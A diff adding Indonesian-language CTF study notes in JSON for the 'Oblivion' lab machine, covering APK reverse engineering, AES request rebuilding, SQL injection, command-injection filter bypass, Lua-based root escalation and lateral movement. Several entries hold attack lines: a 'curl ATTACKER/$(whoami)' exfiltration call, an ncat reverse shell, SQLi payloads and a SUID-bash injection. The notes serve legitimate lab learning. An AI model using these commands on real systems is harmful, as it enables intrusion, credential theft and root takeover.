@@ -3660,5 +3660,499 @@
     ],
     "summary": "Privilege escalation di LoL (CentOS 7, kernel 3.10.0): LinPEAS mengidentifikasi kernel version dan SUID binaries. DirtyCow (CVE-2016-5195) dicoba multiple compile variant, semua gagal. SUID pkexec yang teridentifikasi LinPEAS menjadi target PwnKit (CVE-2021-4034) — exploit berhasil memberikan root shell. User flag didapat dari /home/joni/user.txt, root flag dari /root/root.txt.",
     "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-apk-static",
+    "date": "2026-06-07",
+    "title": "Oblivion — Android APK Static Analysis: Hardcoded AES Key & App Architecture Mapping",
+    "platform": "Hacktrace Ranges",
+    "category": "Reverse Engineering",
+    "tags": [
+      "android",
+      "apk",
+      "static-analysis",
+      "jadx",
+      "apktool",
+      "reverse-engineering",
+      "hardcoded-credentials",
+      "aes",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "APK static analysis workflow: decompile dengan jadx (readable Java source) atau apktool (smali bytecode), identifikasi class structure dan entry points",
+      "Hardcoded secrets dalam mobile apps: AES key, API endpoints, auth tokens sering disimpan langsung di source code atau strings.xml — target utama static analysis",
+      "App architecture mapping dari source: trace endpoint definitions, request/response format, auth flow, dan allowed command list dari Java source code tanpa menjalankan app"
+    ],
+    "terms": [
+      "jadx",
+      "apktool",
+      "APK decompilation",
+      "smali",
+      "hardcoded AES key",
+      "static analysis",
+      "Android reverse engineering",
+      "strings.xml",
+      "app architecture mapping"
+    ],
+    "commands": [
+      "jadx -d output/ target.apk",
+      "apktool d target.apk -o output/",
+      "grep -r 'AES\\|key\\|secret\\|password' output/sources/ --include='*.java'"
+    ],
+    "problems": [
+      "Identifikasi file Java yang relevan dari ratusan class — fokus ke class yang handle network request dan crypto operations"
+    ],
+    "summary": "Static analysis APK Oblivion menggunakan jadx untuk decompile ke readable Java source. Berhasil ekstrak hardcoded AES key dari Java class, map endpoint API, auth flow, dan list allowed commands. Key insight: mobile apps sering menyimpan secrets langsung di source — static analysis adalah step wajib sebelum dynamic testing.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-aes-reimpl",
+    "date": "2026-06-07",
+    "title": "Oblivion — AES/CBC/PKCS5Padding Reimplementation: Custom Encrypted Request Builder in Python",
+    "platform": "Hacktrace Ranges",
+    "category": "Cryptography",
+    "tags": [
+      "aes",
+      "cbc-mode",
+      "pkcs5padding",
+      "pycryptodome",
+      "python",
+      "crypto-implementation",
+      "iv-prepending",
+      "base64",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "AES/CBC/PKCS5Padding: mode CBC membutuhkan IV (Initialization Vector) unik per enkripsi; PKCS5 padding memastikan plaintext multiple of block size (16 bytes)",
+      "IV prepending convention: ciphertext sering dikirim sebagai IV + ciphertext (concatenated) agar receiver bisa decrypt; perlu distrip sebelum decode",
+      "PyCryptodome implementation: AES.new(key, AES.MODE_CBC, iv) untuk encrypt/decrypt; pad/unpad dari Crypto.Util.Padding untuk handle PKCS5",
+      "Base64 encoding layer: encrypted bytes di-encode ke Base64 sebelum dikirim via JSON/HTTP — decode Base64 dulu sebelum decrypt"
+    ],
+    "terms": [
+      "AES",
+      "CBC mode",
+      "PKCS5Padding",
+      "PKCS7",
+      "IV (Initialization Vector)",
+      "PyCryptodome",
+      "Crypto.Cipher.AES",
+      "Crypto.Util.Padding",
+      "IV prepending",
+      "Base64 encoding",
+      "block size"
+    ],
+    "commands": [
+      "pip install pycryptodome",
+      "python3 encrypt.py (custom AES encrypt/decrypt wrapper)",
+      "from Crypto.Cipher import AES; from Crypto.Util.Padding import pad, unpad"
+    ],
+    "problems": [
+      "Memastikan IV length = 16 bytes (AES block size) dan tidak hardcoded — generate random IV per request untuk match app behaviour",
+      "PKCS5 vs PKCS7: Python PyCryptodome menggunakan PKCS7 yang identik dengan PKCS5 untuk block size 16 — tidak perlu konversi"
+    ],
+    "summary": "Reimplementasi AES/CBC/PKCS5Padding dari Java ke Python menggunakan PyCryptodome untuk membangun request yang kompatibel dengan API backend Oblivion. Memahami konvensi IV prepending (IV dikirim sebagai prefix ciphertext) dan layer Base64 encoding. Hasilnya: Python script yang bisa encrypt arbitrary payload dan decrypt server response — fondasi untuk semua serangan selanjutnya.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-sqli-encrypted",
+    "date": "2026-06-07",
+    "title": "Oblivion — SQL Injection Through Encrypted Channel: SQLite Confirmation via Error-Based SQLi",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "sql-injection",
+      "encrypted-channel",
+      "sqlite",
+      "error-based-sqli",
+      "policy-bypass",
+      "aes",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "SQLi through encrypted channel: payload SQLi di-craft dalam plaintext JSON, lalu di-encrypt sebelum dikirim — server decrypt dulu, baru proses (SQLi terjadi di layer aplikasi, bukan transport)",
+      "Server-side password policy bypass: validasi policy yang reject karakter tertentu berjalan sebelum query execution — SQLi payload perlu disusun untuk bypass validation logic",
+      "Error-based SQLi untuk backend identification: trigger database error yang bocorkan nama DBMS (SQLite error message format berbeda dari MySQL/PostgreSQL)",
+      "SQLite-specific exploitation: SQLite tidak support stacked queries di semua context; UNION-based lebih reliable untuk data extraction"
+    ],
+    "terms": [
+      "SQL injection",
+      "encrypted channel",
+      "SQLite",
+      "error-based SQLi",
+      "password policy bypass",
+      "server-side validation",
+      "UNION-based SQLi",
+      "database fingerprinting"
+    ],
+    "commands": [
+      "python3 exploit.py --payload \"' OR 1=1--\"",
+      "python3 exploit.py --payload \"' UNION SELECT sqlite_version()--\""
+    ],
+    "problems": [
+      "Standard SQLi payload (`' OR 1=1--`) ditolak server-side password policy sebelum sampai ke query — perlu craft payload yang bypass validation logic",
+      "Konfirmasi SQLite dari error message: error format 'unrecognized token' atau 'near syntax error' adalah SQLite signature"
+    ],
+    "summary": "SQLi pada API Oblivion dilakukan melalui encrypted channel: payload di-inject ke field JSON yang di-encrypt AES sebelum dikirim. Password policy server memblokir standard injection — bypass dengan variasi payload yang tidak trigger policy. Error-based response mengkonfirmasi SQLite sebagai backend database. Encrypted channel tidak mencegah SQLi — injection terjadi setelah server decrypt payload.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-cmdi-filter-bypass",
+    "date": "2026-06-07",
+    "title": "Oblivion — Command Injection Filter Bypass: Semicolon Chaining in Restricted Character Set",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "command-injection",
+      "filter-bypass",
+      "character-blacklist",
+      "semicolon-chaining",
+      "restricted-shell",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Blacklist enumeration methodology: test setiap special character secara individual untuk identify mana yang diblokir vs allowed — tidak assume semua diblokir",
+      "Semicolon (;) sebagai command chaining separator: alternatif dari pipe (|), ampersand (&), backtick — sering terlewat dari blacklist karena kurang obvious",
+      "Prefix requirement bypass: beberapa aplikasi memvalidasi bahwa command diawali prefix tertentu — bypass dengan menempatkan payload setelah prefix yang valid",
+      "Character blacklist yang umum: | & $ \\ ' \" < ` — semicolon dan newline (%0a) sering tidak masuk blacklist default"
+    ],
+    "terms": [
+      "command injection",
+      "character blacklist",
+      "semicolon chaining",
+      "filter bypass",
+      "command separator",
+      "| & $ pipe ampersand",
+      "restricted command set",
+      "prefix validation"
+    ],
+    "commands": [
+      "python3 exploit.py --cmd 'validprefix; id'",
+      "python3 exploit.py --cmd 'validprefix; cat /etc/passwd'",
+      "python3 exploit.py --cmd 'validprefix; curl ATTACKER/$(whoami)'"
+    ],
+    "problems": [
+      "| & $ \\ ' \" < ` semua diblokir — perlu systematic enumeration untuk temukan separator yang allowed",
+      "Prefix requirement: command harus diawali string tertentu, naked payload ditolak — payload ditempatkan setelah prefix valid menggunakan ;"
+    ],
+    "summary": "Command injection di Oblivion melalui systematic filter bypass: enumerasi karakter forbidden (| & $ \\ ' \" < `) menemukan bahwa semicolon (;) diizinkan sebagai command chaining separator. Combined dengan prefix requirement bypass, arbitrary commands berhasil dieksekusi. Key learning: blacklist enumeration harus exhaustive — satu karakter yang terlewat dari blacklist sudah cukup untuk RCE.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-flask-enum",
+    "date": "2026-06-07",
+    "title": "Oblivion — Flask/Werkzeug Enumeration: POST-Only Endpoints & Source Code Architecture Review",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "flask",
+      "werkzeug",
+      "api-enumeration",
+      "post-only",
+      "source-code-review",
+      "python-web",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "POST-only endpoint discovery: Flask routes yang hanya accept POST tidak terindeks oleh standard GET-based directory scanner — butuh metode lain (source code, error response analysis)",
+      "Flask app architecture dari APK source: backend endpoint paths sering di-hardcode di mobile app — source code APK reveal semua route yang digunakan",
+      "Werkzeug debugger detection: Flask dev mode mengaktifkan Werkzeug interactive debugger yang bisa jadi attack surface (PIN bypass untuk RCE)",
+      "405 Method Not Allowed sebagai endpoint confirmation: endpoint yang return 405 pada GET = valid POST endpoint, bukan 404"
+    ],
+    "terms": [
+      "Flask",
+      "Werkzeug",
+      "POST-only endpoint",
+      "route enumeration",
+      "405 Method Not Allowed",
+      "Werkzeug debugger",
+      "API endpoint discovery",
+      "mobile app backend"
+    ],
+    "commands": [
+      "curl -X GET http://TARGET:5000/api/endpoint (expect 405 if POST-only)",
+      "curl -X POST http://TARGET:5000/api/endpoint -H 'Content-Type: application/json' -d '{...}'"
+    ],
+    "problems": [
+      "Standard directory brute force tidak menemukan endpoint — POST-only routes tidak di-list oleh Gobuster dengan default GET method",
+      "Endpoint list diekstrak dari APK source (jadx) — mobile app adalah source of truth untuk backend API routes"
+    ],
+    "summary": "Enumerasi API Flask Oblivion: endpoint tidak bisa ditemukan dengan standard directory scanner karena POST-only. Sumber endpoint yang benar adalah APK source code hasil jadx decompilation. Flask app architecture (route handlers, middleware, validation logic) dipahami dari source review, bukan dari probing blind. 405 responses mengkonfirmasi valid endpoints sebelum eksploitasi.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-protocol-re",
+    "date": "2026-06-07",
+    "title": "Oblivion — Custom Protocol Reverse Engineering: Rebuilding Encrypted Mobile API Communication",
+    "platform": "Hacktrace Ranges",
+    "category": "Reverse Engineering",
+    "tags": [
+      "protocol-reverse-engineering",
+      "custom-protocol",
+      "mobile-api",
+      "aes-encrypted",
+      "request-reconstruction",
+      "python",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Protocol RE dari mobile app: baca source code (jadx) untuk understand request structure, field names, encoding, auth header format, dan response parsing",
+      "Request/response cycle reconstruction: setelah memahami protokol, bangun ulang full cycle di Python — simulate exact behaviour app tanpa menjalankan app atau intercept traffic",
+      "Auth flow dari source: token generation, session management, dan API key placement sering hardcoded atau derivable dari source code tanpa perlu dynamic analysis"
+    ],
+    "terms": [
+      "protocol reverse engineering",
+      "custom protocol",
+      "encrypted API",
+      "request reconstruction",
+      "mobile backend communication",
+      "static protocol analysis",
+      "auth flow"
+    ],
+    "commands": [
+      "python3 client.py (full custom API client rebuilt from APK source)"
+    ],
+    "problems": [
+      "Urutan operasi kritis: encrypt → Base64 encode → embed dalam JSON field — urutan yang salah menghasilkan server-side decrypt error",
+      "Header auth format harus exact match dengan apa yang app kirim — case-sensitive dan format-sensitive"
+    ],
+    "summary": "Reverse engineering protokol komunikasi encrypted antara mobile app Oblivion dan backend API. Dari APK source (jadx), dipahami full request/response cycle: JSON structure, field names, AES encrypt sequence, Base64 layer, dan auth header format. Rebuilt sebagai Python client yang bisa replay dan modifikasi arbitrary request tanpa app atau traffic intercept.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-wingftp-lua",
+    "date": "2026-06-07",
+    "title": "Oblivion — Wing FTP Lua Script Injection: Writable CGI Script Loaded by Root Service",
+    "platform": "Hacktrace Ranges",
+    "category": "Privilege Escalation",
+    "tags": [
+      "wing-ftp",
+      "lua",
+      "script-injection",
+      "service-privesc",
+      "writable-config",
+      "root-service",
+      "os-execute",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Wing FTP Server Lua CGI: Wing FTP mendukung Lua scripting untuk custom CGI — script ini di-load dan di-execute oleh FTP service process",
+      "Writable script + root-owned service = root privesc: jika user bisa tulis ke Lua script yang di-load service yang jalan sebagai root, maka os.execute() di script = command sebagai root",
+      "os.execute() di Lua: equivalent shell_exec PHP atau subprocess.run Python — eksekusi arbitrary OS command dari Lua script context",
+      "Service-level privesc vector: script/config yang writable oleh low-priv user tapi loaded oleh privileged service adalah privesc vector yang sering terlewat — tidak ada SUID, tidak ada sudo"
+    ],
+    "terms": [
+      "Wing FTP Server",
+      "Lua CGI",
+      "os.execute()",
+      "writable script",
+      "root-owned service",
+      "service privilege escalation",
+      "script injection",
+      "FTP admin panel"
+    ],
+    "commands": [
+      "echo 'os.execute(\"chmod +s /bin/bash\")' >> /path/to/wingftp/lua/script.lua",
+      "curl http://TARGET:5466/cgi/script.lua (trigger Lua execution via Wing FTP admin panel)",
+      "/bin/bash -p (SUID bash → root shell)"
+    ],
+    "problems": [
+      "Identifikasi path Lua script yang writable dan di-load oleh Wing FTP service — butuh enumerate Wing FTP directory structure",
+      "Trigger eksekusi script via Wing FTP admin panel (port 5466) yang ditemukan dari internal enumeration"
+    ],
+    "summary": "Privilege escalation ke root di Oblivion via Wing FTP Lua script injection. Lua CGI script di Wing FTP installation writable oleh current user tapi di-load oleh Wing FTP service yang jalan sebagai root. Inject os.execute() ke script, trigger via admin panel (port 5466) — arbitrary command eksekusi sebagai root. Privesc vector ini tidak membutuhkan SUID atau sudo — cukup writable file yang loaded oleh privileged service.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-service-privesc",
+    "date": "2026-06-07",
+    "title": "Oblivion — Service-Level PrivEsc: Root-Owned Services with User-Writable Scripts as Attack Vector",
+    "platform": "Hacktrace Ranges",
+    "category": "Privilege Escalation",
+    "tags": [
+      "privilege-escalation",
+      "service-misconfiguration",
+      "writable-config",
+      "root-service",
+      "linux-privesc",
+      "enumeration",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Service-level privesc: identifikasi service yang jalan sebagai root, lalu temukan file config/script yang di-load service tersebut dan writable oleh current user",
+      "Enumeration pattern: ps aux (running processes + owner) → find writable files dalam service directory → verify service loads that file → inject payload",
+      "Mengapa ini sering terlewat: privesc checklist fokus ke SUID/sudo/cron — service dengan writable dependency tidak ada di checklist standar",
+      "Applicable ke berbagai service: Nginx include files, Apache .htaccess, FTP server scripts, plugin systems — prinsipnya sama: writable + loaded by root = privesc"
+    ],
+    "terms": [
+      "service-level privesc",
+      "root-owned process",
+      "writable dependency",
+      "ps aux",
+      "process enumeration",
+      "service directory",
+      "privilege escalation checklist"
+    ],
+    "commands": [
+      "ps aux | grep root (identify root-owned processes)",
+      "find /opt /srv /var -writable 2>/dev/null (find writable files in service directories)",
+      "ls -la /path/to/service/ (check ownership of service files)"
+    ],
+    "problems": [
+      "Wing FTP tidak ada di standard privesc checklist — ditemukan dari multi-port enumeration yang mengidentifikasi port 5466 sebagai Wing FTP admin panel"
+    ],
+    "summary": "Service-level privilege escalation sebagai konsep umum yang dipraktikkan di Oblivion: identifikasi proses root (ps aux), temukan file yang di-load service dan writable oleh current user (find writable), inject payload. Tidak bergantung pada SUID, sudo, atau kernel exploit — murni dari misconfigured service file permissions. Perlu jadi bagian dari custom privesc checklist selain tooling standard.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-lateral-movement",
+    "date": "2026-06-07",
+    "title": "Oblivion — Lateral Movement: SQLite Database Dump & Credential Reuse via su",
+    "platform": "Hacktrace Ranges",
+    "category": "Post-Exploitation",
+    "tags": [
+      "lateral-movement",
+      "credential-reuse",
+      "sqlite",
+      "database-dump",
+      "su",
+      "post-exploitation",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "SQLite database dump untuk credential harvesting: sqlite3 CLI atau .dump command mengekstrak semua tabel dan data — cari tabel users/credentials",
+      "Credential reuse via su: password dari database sering dipakai ulang untuk system user — selalu coba su dengan credential yang ditemukan",
+      "Database path discovery: SQLite file sering ada di app directory, /var/db/, atau path yang di-hardcode di config — trace dari source code atau config file"
+    ],
+    "terms": [
+      "SQLite",
+      "sqlite3 CLI",
+      ".dump command",
+      "credential reuse",
+      "su command",
+      "lateral movement",
+      "database credential harvesting",
+      "password reuse"
+    ],
+    "commands": [
+      "sqlite3 /path/to/database.db '.dump'",
+      "sqlite3 /path/to/database.db 'SELECT * FROM users;'",
+      "su targetuser (dengan password dari database)"
+    ],
+    "problems": [
+      "Password di database mungkin hashed — identifikasi hash type (MD5, bcrypt, SHA) dan crack atau cek jika plaintext tersedia"
+    ],
+    "summary": "Lateral movement di Oblivion via SQLite database dump setelah initial access: ekstrak credentials dari database menggunakan sqlite3, credential reuse berhasil untuk su ke target user. Key pattern: credentials yang ditemukan di database/config selalu dicoba untuk lateral movement ke system users sebelum memulai privesc dari scratch.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-revshell-restricted",
+    "date": "2026-06-07",
+    "title": "Oblivion — Reverse Shell in Restricted Environment: ncat -e + setsid for Character Filter Bypass",
+    "platform": "Hacktrace Ranges",
+    "category": "Post-Exploitation",
+    "tags": [
+      "reverse-shell",
+      "restricted-environment",
+      "ncat",
+      "setsid",
+      "filter-bypass",
+      "character-blacklist",
+      "shell-stabilization",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "ncat -e sebagai reverse shell: ncat (nmap's netcat) dengan flag -e /bin/sh mengirim shell ke listener — lebih reliable dari bash -i di beberapa environment",
+      "setsid untuk session detachment: setsid menjalankan process dalam new session, memisahkan dari controlling terminal — membantu bypass filter dan membuat shell lebih stable",
+      "Character filter bypass untuk reverse shell: jika python/bash reverse shell mengandung karakter yang diblokir (/,',\",space), gunakan alternatif (ncat, busybox, mkfifo) atau encode payload",
+      "Shell alternative selection: jika standard python3 -c 'import socket...' blocked, systematically try: bash -i, sh -i, ncat -e, mkfifo pipe, perl, php"
+    ],
+    "terms": [
+      "ncat",
+      "ncat -e",
+      "setsid",
+      "reverse shell",
+      "character filter bypass",
+      "restricted shell",
+      "session detachment",
+      "shell alternative"
+    ],
+    "commands": [
+      "setsid ncat ATTACKER PORT -e /bin/sh",
+      "ncat -lvnp PORT (attacker listener)",
+      "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' (stabilize setelah connect)"
+    ],
+    "problems": [
+      "Python dan bash reverse shell mengandung karakter yang diblokir oleh command injection filter — ncat -e tidak mengandung karakter forbidden tersebut",
+      "setsid diperlukan karena tanpanya shell tidak stable di context tertentu"
+    ],
+    "summary": "Reverse shell di environment restricted (command injection dengan character blacklist) menggunakan ncat -e dengan setsid sebagai workaround. Standard python/bash reverse shells mengandung karakter forbidden (' \" $ dll), sedangkan ncat -e syntax lebih minimalis dan tidak trigger blacklist. setsid membuat process independent dari parent session. Systematic alternative selection adalah skill kritis di restricted environment.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-oblivion-multiport-enum",
+    "date": "2026-06-07",
+    "title": "Oblivion — Multi-Port Service Correlation: Wing FTP Admin Panel Discovery on Port 5466",
+    "platform": "Hacktrace Ranges",
+    "category": "Reconnaissance",
+    "tags": [
+      "nmap",
+      "multi-port",
+      "service-correlation",
+      "wing-ftp",
+      "port-enumeration",
+      "internal-enumeration",
+      "reconnaissance",
+      "ctf",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Multi-port service correlation: 4 port terbuka (22/SSH, 5000/Flask API, 5466/Wing FTP admin, 8080/HTTP) perlu di-correlate — masing-masing bisa serve service yang berbeda",
+      "Mystery port identification via internal enumeration: port yang tidak teridentifikasi Nmap (unknown/filtered) bisa diidentifikasi dari dalam mesin setelah foothold — netstat, ss, process list",
+      "Wing FTP admin panel default port: Wing FTP menggunakan port non-standard untuk admin panel — identifikasi dari process list atau service config setelah foothold",
+      "Dari eksternal ke internal enumeration: Nmap dari luar sering tidak bisa fingerprint semua service (firewall, non-standard response) — internal enumeration dari foothold lebih reliable"
+    ],
+    "terms": [
+      "multi-port enumeration",
+      "service correlation",
+      "Wing FTP",
+      "port 5466",
+      "internal enumeration",
+      "netstat",
+      "ss command",
+      "unknown port",
+      "mystery port"
+    ],
+    "commands": [
+      "nmap -sVC --min-rate 1000 -p- -Pn -T4 TARGET",
+      "ss -tulnp (internal: list all listening ports + process)",
+      "netstat -tulnp (alternative to ss)",
+      "ps aux | grep ftp (identify FTP service process)"
+    ],
+    "problems": [
+      "Port 5466 tidak teridentifikasi oleh Nmap dari luar — fingerprinting dilakukan dari dalam mesin setelah initial foothold via ss/netstat dan process list"
+    ],
+    "summary": "Recon multi-port Oblivion mengidentifikasi 4 port: 22 (SSH), 5000 (Flask API), 5466 (Wing FTP admin), 8080 (HTTP). Port 5466 tidak teridentifikasi dari luar — diidentifikasi sebagai Wing FTP admin panel via internal enumeration (ss + ps aux) setelah foothold. Key learning: external Nmap scan tidak selalu sufficient; internal enumeration dari foothold mengungkap service yang tersembunyi dari luar.",
+    "url": ""
   }
 ]
